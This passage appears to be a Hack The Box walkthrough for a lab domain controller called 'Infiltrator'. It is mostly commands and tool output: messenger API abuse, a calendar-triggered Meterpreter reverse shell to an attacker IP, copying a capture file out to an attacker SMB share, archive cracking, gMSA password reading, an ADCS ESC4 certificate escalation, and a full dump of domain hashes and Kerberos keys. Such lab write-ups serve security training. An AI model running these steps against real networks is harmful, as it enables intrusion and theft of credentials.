NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

#### winpeas

```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)
                                                                                                                                                                                             
     C:\Users\Default
     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\winrm_svc\AppData\Roaming\Output Messenger\SpellCheck
     C:\Users\All Users
     C:\Users\All Users\ntuser.pol
```

#### ADpeas

```
[?] +++++ Searching for Vulnerable Certificate Templates +++++                                                                                                                               
adPEAS does basic enumeration only, consider using https://github.com/GhostPack/Certify or https://github.com/ly4k/Certipy

[?] +++++ Checking Template 'Infiltrator_Template' +++++                                                                                                                                     
[!] Template 'Infiltrator_Template' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'
[!] Identity 'INFILTRATOR\infiltrator_svc$' has 'CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner' permissions on template 'Infiltrator_Template'                                                                                                                                                                                    
[!] Identity 'Local System' has 'GenericAll' permissions on template 'Infiltrator_Template'
Template Name:                          Infiltrator_Template
Template distinguishedname:             CN=Infiltrator_Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=infiltrator,DC=htb
Date of Creation:                       12/28/2024 21:25:56
[+] Extended Key Usage:                 Smartcard Logon, Server Authentication, KDC Authentication, Client Authentication
EnrollmentFlag:                         INCLUDE_SYMMETRIC_ALGORITHMS, PEND_ALL_REQUESTS, PUBLISH_TO_DS
[!] CertificateNameFlag:                ENROLLEE_SUPPLIES_SUBJECT
[!] Template Permissions:               Local System : GenericAll
[!] Template Permissions:               INFILTRATOR\infiltrator_svc$ : CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
```

#### Cetify dont found vuln template in user winrm_svc, maybe need infiltrator_svc user to explore Infiltrator_Template

```
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> .\Certify.exe find /vulnerable

...

[+] No Vulnerable Certificates Templates found!
```


- Need lan_management ---> ReadGMSAPassword ---> infiltrator_svc


## Login outputmessenger with winrm_svc user

```
O.martinez  Feb 20, 1:58 AM
I haven't shared my password with anyone except the Chiefs_Marketing_chat group. Could it be related to that?
```
```
Subject: app managment
lan_managment  api key 558R501T5I6024Y8JV3B7KOUN1A518GG
```

- https://support.outputmessenger.com/user-api/

```
└─$ while read -r user; do curl -s -k -H 'Accept: application/json, text/javascript, */*;' -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Host: infiltrator.htb:14125' "http://127.0.0.1:14125/api/users/$user"; done <users.txt | jq . | grep user

  "message": "administrator user does not exists!"
  "message": "guest user does not exists!"
  "message": "krbtgt user does not exists!"
  "message": "dc01 user does not exists!"
    "user": "D.anderson",
    "user": "O.martinez",
    "user": "K.turner",
    "user": "A.walker",
    "user": "M.harris",
    "user": "L.clark",
    "user": "E.rodriguez",
    "user": "winrm_svc",
  "message": "lan_managment user does not exists!"

```

- https://support.outputmessenger.com/department/

```
└─$ curl -s -k -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Accept: application/json, text/javascript, */*' -H 'Host: infiltrator.htb:14125' "http://127.0.0.1:14125/api/departments" | jq . | grep "departmentname"
      "departmentname": "Administration",
      "departmentname": "Developers",
      "departmentname": "Digital Influencer Marketing",
      "departmentname": "Management and Security",
      "departmentname": "Marketing Team",
      "departmentname": "Others",
      "departmentname": "QA Testers",
```                                     


- https://support.outputmessenger.com/chat-room-api/

```
└─$ curl -s -k -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Accept: application/json, text/javascript, */*' -H 'Host: infiltrator.htb:14125' "http://127.0.0.1:14125/api/chatrooms" | jq .[]                        
[
  {
    "room": "Chiefs_Marketing_chat",
    "roomusers": "O.martinez|0,A.walker|0"
  },
  {
    "room": "Dev_Chat",
    "roomusers": "Admin|0,M.harris|0,K.turner|0,Developer_01|0,Developer_02|0,Developer_03|0"
  },
  {
    "room": "General_chat",
    "roomusers": "Admin|0,D.anderson|0,L.clark|0,M.harris|0,O.martinez|0,A.walker|0,K.turner|0,E.rodriguez|0,winrm_svc|0,Developer_01|0,Developer_02|0,Developer_03|0"
  },
  {
    "room": "Marketing_Team_chat",
    "roomusers": "D.anderson|0,L.clark|0"
  }
]
```


```
*Evil-WinRM* PS C:\Users\winrm_svc\AppData\Roaming\Output Messenger\JAAA> download OM.db3

sqlite> select * from om_chatroom;
1|General_chat|20240219160702@conference.com|General_chat||20240219160702@conference.com|1|2024-02-20 01:07:02.909|0|0||0|0|1||
2|Chiefs_Marketing_chat|20240220014618@conference.com|Chiefs_Marketing_chat||20240220014618@conference.com|1|2024-02-20 10:46:18.858|0|0||0|0|1||
```


```
└─$ curl -s -k -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' -H 'Accept: application/json, text/javascript, */*' -H 'Host: infiltrator.htb:14125' 'http://127.0.0.1:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&fromdate=2024/02/01&todate=2024/02/20' | grep martinez

<div class='msg_body' >O.martinez : m@rtinez@1996!</div><br /></div></div>" 
```

#### o.martinez password dont work in enything


## Login ouputmessenger with o.martinez


#### 1 - after login, go to calendar

#### 2 - go to plus (+) icon and add new event

#### 3 - before add action upload shell executable in same dir of calendar action (Ex: C:\temp\shell.exe)

#### 4 - Actions: Run Application, set day and hour, select a file to execute 

#### To get time of target machine

```
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> date

Wednesday, December 25, 2024 8:38:15 PM
```

#### Wait to time and get shell...


## Shell as O.martinez

- Outbound = o.martinez ---> Memeber of ---> Chiefs Marketing ---> Force Change Password ---> m.harris (No need this)

```
[*] Started HTTPS reverse handler on https://10.10.14.144:4321
[!] https://10.10.14.144:4321 handling request from 10.10.11.31; (UUID: ux1dzpfy) Without a database connected that payload UUID tracking will not work!
[*] https://10.10.14.144:4321 handling request from 10.10.11.31; (UUID: ux1dzpfy) Staging x86 payload (178780 bytes) ...
[!] https://10.10.14.144:4321 handling request from 10.10.11.31; (UUID: ux1dzpfy) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.144:4321 -> 10.10.11.31:53808) at 2024-12-26 14:15:56 -0500

meterpreter > sysinfo
Computer        : DC01
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : INFILTRATOR
Logged On Users : 17
Meterpreter     : x86/windows
      
meterpreter > getuid 
Server username: INFILTRATOR\o.martinez
```

##### winpeas

```
����������͹ Modifiable Services
� Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)
    ConsentUxUserSvc_67bef: GenericExecute (Start/Stop)
    DevicePickerUserSvc_67bef: GenericExecute (Start/Stop)
    DevicesFlowUserSvc_67bef: GenericExecute (Start/Stop)
    PimIndexMaintenanceSvc_67bef: GenericExecute (Start/Stop)
    PrintWorkflowUserSvc_67bef: GenericExecute (Start/Stop)
    UnistoreSvc_67bef: GenericExecute (Start/Stop)
    UserDataSvc_67bef: GenericExecute (Start/Stop)
    WpnUserService_67bef: GenericExecute (Start/Stop)
    ConsentUxUserSvc_bcd16: GenericExecute (Start/Stop)
    DevicePickerUserSvc_bcd16: GenericExecute (Start/Stop)
    DevicesFlowUserSvc_bcd16: GenericExecute (Start/Stop)
    PimIndexMaintenanceSvc_bcd16: GenericExecute (Start/Stop)
    PrintWorkflowUserSvc_bcd16: GenericExecute (Start/Stop)
    UnistoreSvc_bcd16: GenericExecute (Start/Stop)
    UserDataSvc_bcd16: GenericExecute (Start/Stop)
    WpnUserService_bcd16: GenericExecute (Start/Stop)


����������͹ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    O.martinez::INFILTRATOR:1122334455667788:097708e7d83fd90400fdc7e9f2e5a32d:010100000000000067c186041d58db019ad0337f641c92350000000008003000300000000000000001000000002000000db90b579833ec5d8bf3dc43ec34210d51b1623f40f40c797adcd92d812f7ee80a00100000000000000000000000000000000000090000000000000000000000                                                                     


����������͹ Searching hidden files or folders in C:\Users home (can be slow)
                                                                                                                                                                                             
     C:\Users\Default
     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\All Users
     C:\Users\All Users\ntuser.pol
     C:\Users\O.martinez\AppData\Roaming\Output Messenger\SpellCheck

����������͹ Searching interesting files in other users home directories (can be slow)
                                                                                                                                                                                             

����������͹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\O.martinez\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\OutputMessenger.exe": o.martinez [AllAccess]
```


#### get net caputure file

```
C:\Users\O.martinez\AppData\Roaming\Output Messenger\FAAA\Received Files\203301>net use \\10.10.14.144 /user:kali kali
net use \\10.10.14.144 /user:kali kali
The command completed successfully.


C:\Users\O.martinez\AppData\Roaming\Output Messenger\FAAA\Received Files\203301>copy network_capture_2024.pcapng \\10.10.14.144\share\
copy network_capture_2024.pcapng \\10.10.14.144\share\
        1 file(s) copied.
```

#### open pcap file in wireshark, search for BitLocker download file and http post requests to findings

- extract file

```
Go to Edit > Preferences > Protocols > TCP and enable "Allow subdissector to reassemble TCP streams." Then go to File > Export Objects > HTTP. Find and highlight the file and click "Save As."
```

```
new_auth_token: M@rtinez_P@ssw0rd!
```

#### pass spray (winrm not connect)

```
2024/12/27 00:53:59 >  [+] VALID LOGIN:  o.martinez@infiltrator.htb:M@rtinez_P@ssw0rd!
```

#### bitlocker password to extract, has a html file with bitlocker key

```
└─$ 7z2john BitLocker-backup.7z > bitlocker_hash.txt                                             

└─$ john bitlocker_hash.txt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 

zipper           (BitLocker-backup.7z)     
```

```
650540-413611-429792-307362-466070-397617-148445-087043
```


## Login RDP as o.martinez with Remmina

```
└─$ netexec rdp 10.10.11.31 -u users.txt -p 'M@rtinez_P@ssw0rd!'
RDP         10.10.11.31     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True)
...
RDP         10.10.11.31     3389   DC01             [+] infiltrator.htb\o.martinez:M@rtinez_P@ssw0rd! (Pwn3d!)


└─$ netexec rdp 10.10.11.31 -u o.martinez -p 'M@rtinez_P@ssw0rd!' --screenshot
RDP         10.10.11.31     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True)
RDP         10.10.11.31     3389   DC01             [+] infiltrator.htb\o.martinez:M@rtinez_P@ssw0rd! (Pwn3d!)
RDP         10.10.11.31     3389   DC01             Screenshot saved /home/kalibox/.nxc/screenshots/DC01_10.10.11.31_2024-12-27_011021.png
```

#### use bitlocker key to unlock encrypted disk, go to Users -> Administrator -> Documents and get Backup_Credentials.7z

```
└─$ tree             
.
├── Active Directory
├── Backup_Credentials.7z
├── SECURITY
├── SYSTEM
├── ntds.dit
└── registry
```

#### extract passwords from ntds.dit

#### dump creds with secretsdump dont work, hashes dont work https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds#_2-parsing


#### use https://github.com/xmco/parse_ntds and parse csv output file in terminal or use csv parse online

```
└─$ ./parse_ntds.py -f ntds.dit -s SYSTEM -v --dump-all

└─$ cat report_users.csv | grep lan_
infiltrator.htb,lan_managment,4127,S-1-5-21-822140885-2101723098-820748671-1105,aad3b435b51404eeaad3b435b51404ee,e8ade553d9b0cb1769f429d897c92931,"aes256-cts-hmac-sha1-96:6fcd2f66179b6b852bb3cc30f2ba353327924081c47d09bc5a9fafc623016e96 , aes128-cts-hmac-sha1-96:48f45b8eb2cbd8dbf578241ee369ddd9 , des-cbc-md5:31c83197ab944052",,,S-1-5-21-822140885-2101723098-820748671-513,"S-1-5-21-822140885-2101723098-820748671-513 , S-1-5-32-545",2,"infiltrator.htb|Domain Users , infiltrator.htb|Users",0,0,l@n_M@an!1331,2024-02-25 09:08,2024-02-25 09:08,,,1969-12-31 19:00,2024-02-25 09:08,NORMAL_ACCOUNT,,,,,,,,,,,,,1,1,,103

...

l@n_M@an!1331

```

## Lan_managment user

- Outbound = lan_management ---> ReadGMSAPassword ---> infiltrator_svc

#### pass spray

```
2024/12/28 00:41:52 >  [+] VALID LOGIN:  lan_managment@infiltrator.htb:l@n_M@an!1331
```

#### ReadGMSAPassword abuse get infiltrator_svc nthash

- https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword
- https://github.com/micahvandeusen/gMSADumper

```
└─$ python3 gMSADumper.py -u lan_managment -p 'l@n_M@an!1331' -d infiltrator.htb
Users or groups who can read password for infiltrator_svc$:
 > lan_managment
infiltrator_svc$:::85b7e81e4302c12e3aa2170cb0803fd5
infiltrator_svc$:aes256-cts-hmac-sha1-96:544d2d6380c5b70d18c7c281be2319074fdc4df165c475ad1172a306891527f3
infiltrator_svc$:aes128-cts-hmac-sha1-96:2604dfa855cf90cfa440505ac9a7b1c6
```


## ADCS Escalation with infiltrator_svc

- https://github.com/ly4k/Certipy

```
└─$ certipy find -u 'infiltrator_svc$' -hashes :85b7e81e4302c12e3aa2170cb0803fd5 -dc-ip 10.10.11.31 -debug        

 33
    Template Name                       : Infiltrator_Template
    Display Name                        : Infiltrator_Template
    Certificate Authorities             : infiltrator-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          PendAllRequests
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Smart Card Logon
                                          Server Authentication
                                          KDC Authentication
                                          Client Authentication
    Requires Manager Approval           : True
    Requires Key Archival               : False
    Authorized Signatures Required      : 1
    Validity Period                     : 99 years
    Renewal Period                      : 650430 hours
    Minimum RSA Key Length              : 2048
    Permissions
      Object Control Permissions
        Owner                           : INFILTRATOR.HTB\Local System
        Full Control Principals         : INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
        Write Owner Principals          : INFILTRATOR.HTB\infiltrator_svc
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
        Write Dacl Principals           : INFILTRATOR.HTB\infiltrator_svc
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
        Write Property Principals       : INFILTRATOR.HTB\infiltrator_svc
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
    [!] Vulnerabilities
      ESC4                              : 'INFILTRATOR.HTB\\infiltrator_svc' has dangerous permissions
```

- https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-template-access-control-esc4
- https://www.thehacker.recipes/ad/movement/adcs/access-controls#certificate-templates-esc4

#### 1

```
└─$ certipy template -u 'infiltrator_svc$' -hashes :85b7e81e4302c12e3aa2170cb0803fd5 -template 'Infiltrator_Template' -dc-ip 10.10.11.31 -save-old
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'Infiltrator_Template' to 'Infiltrator_Template.json'
[*] Updating certificate template 'Infiltrator_Template'
[*] Successfully updated 'Infiltrator_Template'
```
#### 2

```
└─$ certipy req -u 'infiltrator_svc$' -hashes :85b7e81e4302c12e3aa2170cb0803fd5 -ca 'infiltrator-DC01-CA' -template 'Infiltrator_Template' -target infiltrator.htb -upn administrator@infiltrator.htb -dc-ip 10.10.11.31 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'infiltrator.htb' at '10.10.11.31'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.31[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.31[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with UPN 'administrator@infiltrator.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```
#### 3 

- https://github.com/ly4k/Certipy?tab=readme-ov-file#authenticate

```
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.31
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@infiltrator.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@infiltrator.htb': aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1
```

## Login as Adminstrator

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         8/3/2024   7:46 AM                Infiltrator ADCS Backups
-a----         8/3/2024   7:46 AM         171340 backup.zip
-ar---       12/28/2024   9:07 AM             34 root.txt
```

```
└─$ impacket-secretsdump -hashes :1356f502d2764368302ff0369b1121a1 infiltrator.htb/administrator@10.10.11.31
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb69149edc42a85733e4efe5e35a33e87
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4dc8e10f3a29237b05bdfdb5bded5451:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
INFILTRATOR\DC01$:aes256-cts-hmac-sha1-96:15db1652b02a83f4324bd8ba4f2a20eb8ea7631bf87dfec2d4f97ebeff32435d
INFILTRATOR\DC01$:aes128-cts-hmac-sha1-96:70d8ad0059f5e81f43310c34e9937556
INFILTRATOR\DC01$:des-cbc-md5:80fe9dbfa22531ab
INFILTRATOR\DC01$:plain_password_hex:0a3183391dac772712b98e94fead3b9456bfedcc57c953d18084f50e94cf42d6c08434a1d3217c2fe151916a0ae7867c415ab8d3546f4ecc4707410ca56e2556aef2298066f7842ec1ad4819706032c10db5d22ff762c9a4fdeb82405627c04ed0ae8ee0514170acb1f0fa8964a2d045ba16b749ef89933bccd53b25a8aa0f5d17c2d519f9aa7a939b1fb9701bb88a1abb5efdfbcd02226e09032d8ffced8801e6cf8adf16bceb1491482d23a8281326cc82a6fa06425336d1422cd3b1cadd389263a9f557ce5221a86b28a71dc6276a0ac8165b7c5c5929dd3998130bbd7b9e41b9a8e4d69e1b7a614f25b6a8aa672b
INFILTRATOR\DC01$:aad3b435b51404eeaad3b435b51404ee:c4d8ecef85fdd70a87fa9c8da56a417f:::
[*] DefaultPassword 
INFILTRATOR\Administrator:Infiltrator_Box1337!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xbd8a15f7e24918ac40db6b340498aeda032c4fc0
dpapi_userkey:0xf0f81997f3c057103ab87ac71dc986c455880e83
[*] NL$KM 
 0000   A9 F8 C1 38 F1 FB 53 1A  E1 12 CA 8A 61 D3 C1 D6   ...8..S.....a...
 0010   67 09 77 BC BC C6 BC 2F  5D E3 18 3D 66 DB 6D 9F   g.w..../]..=f.m.
 0020   03 30 80 2D 25 9F 69 56  39 55 EA A3 50 D0 CA 0F   .0.-%.iV9U..P...
 0030   C6 18 45 14 9E 8E B6 3C  46 49 6F 3B FA EF FE 89   ..E....<FIo;....
NL$KM:a9f8c138f1fb531ae112ca8a61d3c1d6670977bcbcc6bc2f5de3183d66db6d9f0330802d259f69563955eaa350d0ca0fc61845149e8eb63c46496f3bfaeffe89
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d400d2ccb162e93b66e8025118a55104:::
infiltrator.htb\D.anderson:1103:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::
infiltrator.htb\L.clark:1104:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::
infiltrator.htb\M.harris:1105:aad3b435b51404eeaad3b435b51404ee:3ed8cf1bd9504320b50b2191e8fb7069:::
infiltrator.htb\O.martinez:1106:aad3b435b51404eeaad3b435b51404ee:daf40bbfbf00619b01402e5f3acd40a9:::
infiltrator.htb\A.walker:1107:aad3b435b51404eeaad3b435b51404ee:f349468bb2c669ec8c3fd4154fdfe126:::
infiltrator.htb\K.turner:1108:aad3b435b51404eeaad3b435b51404ee:a119c0d5af383e9591ebb67857e2b658:::
infiltrator.htb\E.rodriguez:1109:aad3b435b51404eeaad3b435b51404ee:b02e97f2fdb5c3d36f77375383449e56:::
infiltrator.htb\winrm_svc:1601:aad3b435b51404eeaad3b435b51404ee:120c6c7a0acb0cd808e4b601a4f41fd4:::
infiltrator.htb\lan_managment:8101:aad3b435b51404eeaad3b435b51404ee:a1983d156e1d0fdf9b01208e2b46670d:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:c4d8ecef85fdd70a87fa9c8da56a417f:::
infiltrator_svc$:3102:aad3b435b51404eeaad3b435b51404ee:85b7e81e4302c12e3aa2170cb0803fd5:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d9ae321762ce3d90ff7835a9e9a8fe453bcc3b35c0cb212326e0efb2e8b29ba
Administrator:aes128-cts-hmac-sha1-96:762b10a1e2296a49bab7da1ce32755ed
Administrator:des-cbc-md5:0497041f3e5d2598
krbtgt:aes256-cts-hmac-sha1-96:673c00e9dd5ca94e9be6312a159fc1c4e2ef95792ec45f867ec2c1ad439f3150
krbtgt:aes128-cts-hmac-sha1-96:674de1e736dbefda6f24dd914e598d79
krbtgt:des-cbc-md5:a4b9c73bc4a46bcd
infiltrator.htb\D.anderson:aes256-cts-hmac-sha1-96:42447533e9f1c9871ddd2137def662980e677a748b5d184da910d3c4daeb403f
infiltrator.htb\D.anderson:aes128-cts-hmac-sha1-96:021e189e743a78a991616821138e2e69
infiltrator.htb\D.anderson:des-cbc-md5:1529a829132a2345
infiltrator.htb\L.clark:aes256-cts-hmac-sha1-96:dddc0366b026b09ebf0ac3e7a7f190b491c4ee0d7976a4c3b324445485bf1bfc
infiltrator.htb\L.clark:aes128-cts-hmac-sha1-96:5041c75e19de802e0f7614f57edc8983
infiltrator.htb\L.clark:des-cbc-md5:cd023d5d70e6aefd
infiltrator.htb\M.harris:aes256-cts-hmac-sha1-96:90dd4ed523ecc25972afe0b133cad79d5c5b88e6bc5cd1a8d2920ccb45b15596
infiltrator.htb\M.harris:aes128-cts-hmac-sha1-96:bf1e51ae7fa659e146833d8de8ff3d17
infiltrator.htb\M.harris:des-cbc-md5:7fabf8e6e5678a67
infiltrator.htb\O.martinez:aes256-cts-hmac-sha1-96:d497f5a48df0dd55d34c79c7893867a3aad8b222dc7f41af67a1476735c9ed75
infiltrator.htb\O.martinez:aes128-cts-hmac-sha1-96:a062fd39eee45a7ceea3f8e5b7525d10
infiltrator.htb\O.martinez:des-cbc-md5:70f8164a9713ba8c
infiltrator.htb\A.walker:aes256-cts-hmac-sha1-96:cbaeaefb06f17d3eb1d49550e5714fbdf517922c841375cd6a6cd750aa5e3efe
infiltrator.htb\A.walker:aes128-cts-hmac-sha1-96:27b89dea58e7a98cfadc60b2af7ab568
infiltrator.htb\A.walker:des-cbc-md5:a4515dd5d09be9b9
infiltrator.htb\K.turner:aes256-cts-hmac-sha1-96:0f75078e57f71485606fef572b36a278645e2053438e8596c48be7e41e56055a
infiltrator.htb\K.turner:aes128-cts-hmac-sha1-96:fb14214da9c033aa04c0d559abbd3f7a
infiltrator.htb\K.turner:des-cbc-md5:b94a5d234307459b
infiltrator.htb\E.rodriguez:aes256-cts-hmac-sha1-96:52c2444473f775e05ba01744af63901249a018ade7369a262981ce3aeede220a
infiltrator.htb\E.rodriguez:aes128-cts-hmac-sha1-96:9988b989a3d40045326f8908094a79be
infiltrator.htb\E.rodriguez:des-cbc-md5:2f013eea29c7f237
infiltrator.htb\winrm_svc:aes256-cts-hmac-sha1-96:61f308b54f3b17ed48c2877c775a6aa37789b46c1741e356f6fcdab75373d1ca
infiltrator.htb\winrm_svc:aes128-cts-hmac-sha1-96:1d454266ab84bfe7ce7bb03e48a23ac7
infiltrator.htb\winrm_svc:des-cbc-md5:01ce70109ecea73b
infiltrator.htb\lan_managment:aes256-cts-hmac-sha1-96:e66b410341a87c4f1ff382e9c4e3e26d0a351de2ebea9ba0d234b7713cfb0ce6
infiltrator.htb\lan_managment:aes128-cts-hmac-sha1-96:5bf2b52baf80470a2dfe5466c44e9896
infiltrator.htb\lan_managment:des-cbc-md5:b6044c94896e57f1
DC01$:aes256-cts-hmac-sha1-96:15db1652b02a83f4324bd8ba4f2a20eb8ea7631bf87dfec2d4f97ebeff32435d
DC01$:aes128-cts-hmac-sha1-96:70d8ad0059f5e81f43310c34e9937556
DC01$:des-cbc-md5:fb2954402cd32f5e
infiltrator_svc$:aes256-cts-hmac-sha1-96:544d2d6380c5b70d18c7c281be2319074fdc4df165c475ad1172a306891527f3
infiltrator_svc$:aes128-cts-hmac-sha1-96:2604dfa855cf90cfa440505ac9a7b1c6
infiltrator_svc$:des-cbc-md5:074fc1e9866bc854
```

